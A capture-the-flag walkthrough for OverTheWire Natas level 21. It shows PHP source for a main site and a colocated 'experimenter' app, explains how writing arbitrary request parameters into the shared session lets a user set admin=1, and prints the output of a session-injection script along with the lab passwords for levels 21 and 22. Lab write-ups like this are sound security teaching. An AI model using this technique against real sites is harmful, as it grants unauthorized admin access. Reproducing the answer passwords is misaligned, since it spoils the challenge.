# Natas21 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
URL:      http://natas21.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- We have to login as admin. This is the first lab that introduce the `experimenter` web app.

  ```
  MAIN APP SOURCE CODE
  
  <body>
  <h1>natas21</h1>
  <div id="content">
  <p>
  <b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
  </p>
  
  <?php
  
  function print_credentials() { /* {{{ */
      if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
      print "You are an admin. The credentials for the next level are:<br>";
      print "<pre>Username: natas22\n";
      print "Password: <censored></pre>";
      } else {
      print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
      }
  }
  /* }}} */
  
  session_start();
  print_credentials();
  
  ?>
  
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

  ```
  EXPERIMENTER SOURCE CODE
  
  <html>
  <head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
  <body>
  <h1>natas21 - CSS style experimenter</h1>
  <div id="content">
  <p>
  <b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
  </p>
  <?php
  
  session_start();
  
  // if update was submitted, store it
  if(array_key_exists("submit", $_REQUEST)) {
      foreach($_REQUEST as $key => $val) {
      $_SESSION[$key] = $val;
      }
  }
  
  if(array_key_exists("debug", $_GET)) {
      print "[DEBUG] Session contents:<br>";
      print_r($_SESSION);
  }
  
  // only allow these keys
  $validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
  $form = "";
  
  $form .= '<form action="index.php" method="POST">';
  foreach($validkeys as $key => $defval) {
      $val = $defval;
      if(array_key_exists($key, $_SESSION)) {
      $val = $_SESSION[$key];
      } else {
      $_SESSION[$key] = $val;
      }
      $form .= "$key: <input name='$key' value='$val' /><br>";
  }
  $form .= '<input type="submit" name="submit" value="Update" />';
  $form .= '</form>';
  
  $style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
  $example = "<div style='$style'>Hello world!</div>";
  
  ?>
  
  <p>Example:</p>
  <?=$example?>
  
  <p>Change example values here:</p>
  <?=$form?>
  
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

- Exploit summary:

This level consists of **two colocated applications**:

- `http://natas21.natas.labs.overthewire.org` (main)
- `http://natas21-experimenter.natas.labs.overthewire.org` (experimenter)

The experimenter allows you to **set arbitrary session values** via POST or GET parameters. These session values are saved on the back-end using the standard `PHPSESSID` cookie.

If you set `admin=1`, and then reuse that same session ID on the main domain, the main site checks the session and gives you the credentials for the next level.

- I wrote a script that will do all job for us.

  ```
  $ python3 session-fixation.py  
  <html>
  <head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
  <body>
  <h1>natas21 - CSS style experimenter</h1>
  <div id="content">
  <p>
  <b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
  </p>
  [DEBUG] Session contents:<br>Array
  (
      [debug] =>  
      [submit] =>  
      [admin] => 1
  )
  
  <p>Example:</p>
  <div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
  <p>Change example values here:</p>
  <form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  
  <html>
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas21", "pass": "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH" };</script></head>
  <body>
  <h1>natas21</h1>
  <div id="content">
  <p>
  <b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
  </p>
  You are an admin. The credentials for the next level are:<br><pre>Username: natas22
  Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

---

## 🏁 Password for the next level

`Password for natas22 is: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
